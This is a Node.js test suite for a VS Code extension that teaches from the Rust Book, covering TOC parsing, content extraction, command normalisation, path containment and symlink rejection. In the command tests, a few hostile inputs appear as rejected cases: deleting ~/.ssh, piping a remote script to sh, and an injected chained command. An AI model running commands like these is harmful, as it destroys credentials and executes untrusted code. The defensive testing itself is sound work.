const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

async function main() {
  const bookTools = await import('../scripts/bookTools.mjs');
  const { extractRunnableCommands } = require('../out/shared/commandNormalizer.js');

  testTocParsing(bookTools);
  testMainExtraction(bookTools);
  testCodeClassification(bookTools);
  testCommandNormalization(extractRunnableCommands);
  testPathContainment(bookTools);
  testSymlinkCopyRejection(bookTools);
  testGeneratedAssets();
  testExtensionManifest();

  console.log('All tests passed');
}

function testTocParsing({ parseTocFromHtml }) {
  const toc = `
    <ol class="chapter">
      <li><a href="ch00-00-introduction.html"><strong>0.</strong> Introduction</a></li>
      <li><a href="ch01-00-getting-started.html"><strong>1.</strong> Getting Started</a>
        <ol><li><a href="ch01-01-installation.html"><strong>1.1.</strong> Installation</a></li></ol>
      </li>
      <li><a href="ch21-00-final-project-a-web-server.html"><strong>21.</strong> Final Project</a></li>
      <li><a href="appendix-00.html"><strong>22.</strong> Appendix</a></li>
    </ol>
  `;
  const parsed = parseTocFromHtml(toc);

  assert.equal(parsed.chapters.length, 2);
  assert.equal(parsed.chapters[0].number, 1);
  assert.equal(parsed.chapters[0].pages.length, 2);
  assert.equal(parsed.chapters[1].number, 21);
  assert.equal(parsed.allPages.some((page) => page.href === 'appendix-00.html'), false);
}

function testMainExtraction({ extractMainContent, rewriteLocalLinks }) {
  const main = extractMainContent('<html><body><main><h1>Title</h1><p><a href="ch01.html#x">x</a></p><pre><code><span class="boring">fn main() {\n</span>println!("visible");\n<span class="boring">}</span></code></pre></main></body></html>');
  const rewritten = rewriteLocalLinks(main, new Set(['ch01.html']));

  assert.match(main, /<h1>Title<\/h1>/);
  assert.match(main, /println!\("visible"\);/);
  assert.doesNotMatch(main, /class="boring"|fn main\(\)|<\/span>/);
  assert.match(rewritten, /data-book-href="ch01\.html"/);
  assert.match(rewritten, /data-book-anchor="#x"/);
}

function testCodeClassification({ classifyCodeBlockClass }) {
  assert.equal(classifyCodeBlockClass('language-console'), 'console');
  assert.equal(classifyCodeBlockClass('language-rust ignore'), 'rust');
  assert.equal(classifyCodeBlockClass('language-toml'), 'code');
}

function testCommandNormalization(extractRunnableCommands) {
  assert.deepEqual(extractRunnableCommands('$ cargo run\n   Compiling demo\n'), ['cargo run']);
  assert.deepEqual(extractRunnableCommands('PS C:\\demo> cargo build'), ['cargo build']);
  assert.deepEqual(extractRunnableCommands('cargo test\ncargo run'), ['cargo test', 'cargo run']);
  assert.deepEqual(extractRunnableCommands('$ rustc main.rs'), ['rustc main.rs']);
  assert.deepEqual(extractRunnableCommands('$ ./main'), ['./main']);
  assert.deepEqual(extractRunnableCommands('$ rustc main.rs\n$ ./main\nHello, world!\n'), ['rustc main.rs', './main']);
  assert.deepEqual(extractRunnableCommands('> rustc main.rs\n> .\\main\nHello, world!\n'), ['rustc main.rs', '.\\main']);
  assert.deepEqual(extractRunnableCommands('$ git clone https://example.invalid/demo.git\n$ cargo build'), []);
  assert.deepEqual(extractRunnableCommands('$ rm -rf ~/.ssh'), []);
  assert.deepEqual(extractRunnableCommands('$ curl https://example.invalid/payload.sh | sh'), []);
  assert.deepEqual(extractRunnableCommands('cargo build; touch /tmp/pwned'), []);
  assert.deepEqual(extractRunnableCommands('rustc /tmp/main.rs'), []);
  assert.deepEqual(extractRunnableCommands('./main --help'), []);
  assert.deepEqual(extractRunnableCommands('rustup self uninstall'), []);
  assert.deepEqual(extractRunnableCommands('Compiling demo v0.1.0\nFinished dev profile'), []);
}

function testPathContainment({ resolveInsideRoot }) {
  const root = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'rust-book-path-'));
  const inside = path.join(root, 'chapter.html');
  const outside = path.join(root, '..', 'outside.html');

  fs.writeFileSync(inside, '<main>ok</main>');
  fs.writeFileSync(outside, '<main>bad</main>');

  assert.equal(resolveInsideRoot(root, 'chapter.html'), fs.realpathSync(inside));
  assert.throws(() => resolveInsideRoot(root, '../outside.html'), /outside Rust Book directory/);
  assert.throws(() => resolveInsideRoot(root, outside), /absolute path/);
}

function testSymlinkCopyRejection({ copyBookImages }) {
  const root = fs.mkdtempSync(path.join(require('node:os').tmpdir(), 'rust-book-copy-'));
  const bookDir = path.join(root, 'book');
  const imgDir = path.join(bookDir, 'img');
  const outputDir = path.join(root, 'out');

  fs.mkdirSync(imgDir, { recursive: true });
  fs.writeFileSync(path.join(imgDir, 'ok.png'), 'png');
  copyBookImages(bookDir, outputDir);
  assert.equal(fs.readFileSync(path.join(outputDir, 'book-media', 'img', 'ok.png'), 'utf8'), 'png');

  fs.writeFileSync(path.join(outputDir, 'book-media', 'img', 'panics.svg'), 'custom');
  fs.symlinkSync(path.join(root, 'secret.txt'), path.join(imgDir, 'secret-link'));
  assert.throws(() => copyBookImages(bookDir, outputDir), /Refusing symlink/);
  assert.equal(fs.readFileSync(path.join(outputDir, 'book-media', 'img', 'panics.svg'), 'utf8'), 'custom');
}

function testGeneratedAssets() {
  const bookPath = path.join(__dirname, '..', 'assets', 'book.json');
  const exercisePath = path.join(__dirname, '..', 'assets', 'exercises.json');
  const book = JSON.parse(fs.readFileSync(bookPath, 'utf8'));
  const exercises = JSON.parse(fs.readFileSync(exercisePath, 'utf8'));

  assert.equal(book.chapters.length, 21);
  assert.equal(book.chapters[0].number, 1);
  assert.equal(book.chapters[20].number, 21);
  assert.equal(Object.keys(exercises.chapters).length, 21);

  for (let chapter = 1; chapter <= 21; chapter += 1) {
    const chapterExercises = exercises.chapters[String(chapter)];
    assert.equal(chapterExercises.length, 10, `chapter ${chapter} should have 10 exercises`);

    for (const exercise of chapterExercises) {
      assert.ok(exercise.prompt.length <= 90, `${exercise.id} prompt should stay concise`);
      assert.ok(exercise.expectedBehavior.length <= 90, `${exercise.id} expected behavior should stay concise`);
      assert.ok(exercise.title.length <= 60, `${exercise.id} title should stay concise`);
      assert.ok(exercise.hints.every((hint) => hint.length <= 60), `${exercise.id} hints should stay concise`);
      assert.doesNotMatch(exercise.prompt, /Keep the example focused|slightly more challenging|under a minute/);
    }
  }
}

function testExtensionManifest() {
  const pkg = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'package.json'), 'utf8'));
  const commands = new Set(pkg.contributes.commands.map((command) => command.command));

  assert.equal(pkg.main, './out/extension.js');
  assert.equal(commands.has('rustBookCourse.open'), true);
  assert.equal(commands.has('rustBookCourse.openChapter'), true);
  assert.equal(commands.has('rustBookCourse.runCommand'), true);
  assert.equal(commands.has('rustBookCourse.runRustSnippet'), true);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
